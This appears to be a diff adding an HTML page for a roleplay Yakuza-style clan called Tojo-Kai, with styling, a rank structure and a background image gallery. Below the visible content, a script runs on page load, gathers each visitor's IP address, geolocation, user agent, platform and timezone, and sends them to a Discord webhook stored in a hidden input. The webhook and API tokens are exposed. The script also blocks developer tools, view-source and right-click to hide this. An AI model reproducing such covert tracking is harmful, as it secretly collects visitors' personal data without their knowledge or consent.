@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TOJO KAI</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;600&display=swap');
+
+    body {
+      background: linear-gradient(145deg, #0d0d0d, #1a1a1a);
+      color: #f2f2f2;
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background-color: #1a1a1a;
+      padding: 2rem;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
+      max-width: 400px;
+      width: 90%;
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .bio {
+      font-size: 1rem;
+      margin: 1rem 0;
+      color: #ccc;
+    }
+
+    .links {
+      margin-top: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .links a {
+      padding: 10px;
+      background-color: #00ffff20;
+      border: 1px solid #00ffff70;
+      border-radius: 12px;
+      color: #00ffff;
+      text-decoration: none;
+      font-weight: 600;
+      transition: 0.2s ease;
+    }
+
+    .links a:hover {
+      background-color: #00ffff40;
+      transform: scale(1.05);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .clan {
+      background: rgba(18, 18, 18, 0.9);
+      padding: 2rem;
+      border-radius: 18px;
+      margin-top: 2rem;
+      box-shadow: 0 0 25px rgba(0, 255, 255, 0.05);
+      color: #e5e5e5;
+      font-size: 1rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    
+    .clan-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 14px;
+      margin-bottom: 1rem;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    
+    .clan h2 {
+      font-size: 1.8rem;
+      color: #00ffff;
+      text-align: center;
+      margin-bottom: 1rem;
+      font-weight: 700;
+    }
+    
+    .clan-desc {
+      color: #ccc;
+      text-align: center;
+      font-size: 1rem;
+      line-height: 1.6;
+      margin-bottom: 1.8rem;
+    }
+    
+    .clan-structure h3 {
+      font-size: 1.2rem;
+      color: #00ffff;
+      margin-bottom: 0.8rem;
+      text-align: center;
+    }
+    
+    .clan-structure ul {
+      list-style: none;
+      padding: 0;
+      margin: 0 auto;
+      max-width: 500px;
+    }
+    
+    .clan-structure li {
+      margin-bottom: 0.5rem;
+      color: #eee;
+      font-size: 0.95rem;
+      text-align: center;
+    }
+    
+    .clan-structure strong {
+      color: #ffffff;
+      font-weight: 600;
+    }
+    
+    .gallery {
+      margin-top: 40px;
+    }
+
+    .gallery h2 {
+      color: #00f7ff;
+      margin-bottom: 20px;
+    }
+
+    .images {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 20px;
+      justify-items: center;
+    }
+
+    .images img {
+      width: 150px;
+      height: 150px;
+      object-fit: cover;
+      border-radius: 12px;
+      border: 2px solid #00f7ff;
+      
+    }
+    .background-gallery {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
+      z-index: -1;
+      filter: blur(15px) brightness(0.5);
+    }
+    
+    .background-gallery img {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      opacity: 0;
+      animation: bgfade 36s infinite;
+    }
+    
+    .background-gallery img:nth-child(1) { animation-delay: 0s; }
+    .background-gallery img:nth-child(2) { animation-delay: 6s; }
+    .background-gallery img:nth-child(3) { animation-delay: 12s; }
+    .background-gallery img:nth-child(4) { animation-delay: 18s; }
+    .background-gallery img:nth-child(5) { animation-delay: 24s; }
+    .background-gallery img:nth-child(6) { animation-delay: 30s; }
+    
+    @keyframes bgfade {
+      0%   { opacity: 0; }
+      8%   { opacity: 1; }
+      25%  { opacity: 1; }
+      33%  { opacity: 0; }
+      100% { opacity: 0; }
+    }
+    
+  </style>
+</head>
+<body>
+  <input type="hidden" id="hidden-webhook" data-webhook="https://discord.com/api/webhooks/1358800842995531927/7sK8AwlIyy16NliKLzz0i-iZL_evnF2Sr-U2fHFT3sRaIAbv41LrF5MDMxWdL76ZbXOh" />
+
+
+  <div class="clan">
+    <img src="logo-tk.png" alt="Tojo-Kai Icon" class="clan-icon">
+
+    <h2>Tojo-Kai | 東城会</h2>
+    <p class="clan-desc">
+      The Tojo-Kai is a dominant Yakuza syndicate built on tradition, discipline, and absolute loyalty. 
+      Rising from the ashes of the Chihara-kai, the clan now enforces its rule with calculated brutality, 
+      strategic alliances, and a relentless pursuit of power.
+    </p>
+    
+    <div class="clan-structure">
+      <h3>Clan Structure</h3>
+      <ul>
+        <li><strong>女上司 | (Onna)-Kumicho</strong> — Clan Head</li>
+        <li><strong>Saiko Komon</strong> — Chief Advisor</li>
+        <li><strong>So-Honbuncho</strong> — Oversees Ops & Events</li>
+        <li><strong>Wakagashira</strong> — Executive(s)</li>
+        <li><strong>Shateigashira</strong> — Lieutenant(s)</li>
+        <li><strong>Kyodai</strong> — Full Member</li>
+        <li><strong>Shatei</strong> — Junior Member</li>
+        <li><strong>Senshi</strong> — Aspirant</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="gallery">
+    
+    <div class="background-gallery">
+      <img src="pic1.png" />
+      <img src="pic2.png" />
+      <img src="pic3.png" />
+      <img src="pic4.png" />
+      <img src="pic5.png" />
+      <img src="pic6.png" />
+      <img src="pic7.png" alt="">
+    </div>
+  </div>
+  <script>
+    async function getIPInfo() {
+      // Fetch the IP from ipify
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip; // Ensure ip is not undefined
+  
+      if (!ip) {
+          console.error('IP could not be fetched');
+          return;
+      }
+  
+      // Fetch location info using ipinfo.io
+      const locationRes = await fetch(`https://ipinfo.io/${ip}/json?token=6447b620b1b0a1`);
+      const locationData = await locationRes.json();
+      const location = locationData.city && locationData.region && locationData.country
+          ? `${locationData.city}, ${locationData.region}, ${locationData.country}`
+          : "Unknown Location";
+  
+      const deviceInfo = navigator.userAgent;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const currentTime = new Date().toLocaleString();
+  
+      // Retrieve the webhook URL from the hidden element
+      const webhookURL = document.getElementById('hidden-webhook').getAttribute('data-webhook');
+  
+      // Card-like styled content for Discord webhook
+      const payload = {
+          content: `**🌐 New Visitor Detected!**
+          \n🕒 **Time**: ${currentTime}
+          \n📍 **IP**: ${ip}
+          \n🌍 **Location**: ${location}
+          \n💻 **Device**: ${navigator.platform}
+          \n🕵️ **User Agent**: ${deviceInfo}
+          \n🔄 **Timezone**: ${timezone}
+          \n**🌐 == DONE ==**
+          \n`
+      };
+  
+      // Sending data to Discord Webhook
+      fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload) // ensure valid JSON payload
+      }).then(res => {
+          if (res.ok) {
+              console.log("Webhook sent successfully");
+          } else {
+              console.error("Failed to send webhook", res);
+          }
+      }).catch(err => {
+          console.error("Error in sending webhook", err);
+      });
+  }
+  
+  getIPInfo();
+      
+  document.addEventListener('keydown', function (event) {
+        // Mencegah F12, Ctrl+Shift+I, Ctrl+U dan pintasan lainnya
+        // F12 untuk Windows/Linux
+        if (event.key === 'F12' || 
+            (event.ctrlKey && event.shiftKey && event.key === 'I') || // Ctrl+Shift+I
+            (event.ctrlKey && event.key === 'U') || // Ctrl+U untuk view source
+            (event.metaKey && event.key === 'U')) { // Cmd+U untuk Mac
+
+            event.preventDefault();
+            alert("REJECTED!");
+        }
+
+        // Mencegah pintasan khusus Mac
+        if (event.metaKey && event.key === 'I') { // Cmd+I di Mac
+            event.preventDefault();
+            alert("REJECTED!");
+        }
+    });
+
+    // Mencegah klik kanan untuk membuka Developer Tools
+    document.addEventListener('contextmenu', function (event) {
+        event.preventDefault();
+        alert("REJECTED!");
+    });
+
+    // Deteksi apakah Developer Tools dibuka melalui perubahan ukuran jendela
+    let devToolsOpen = false;
+    const threshold = 160;
+
+    function detectDevTools() {
+        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+
+        if (widthThreshold || heightThreshold) {
+            if (!devToolsOpen) {
+                devToolsOpen = true;
+                alert("REJECTED!");
+            }
+        } else {
+            devToolsOpen = false;
+        }
+    }
+
+    // Jalankan deteksi setiap 1 detik
+    setInterval(detectDevTools, 1000);
+
+    </script>
+    
+
+</body>
+</html>
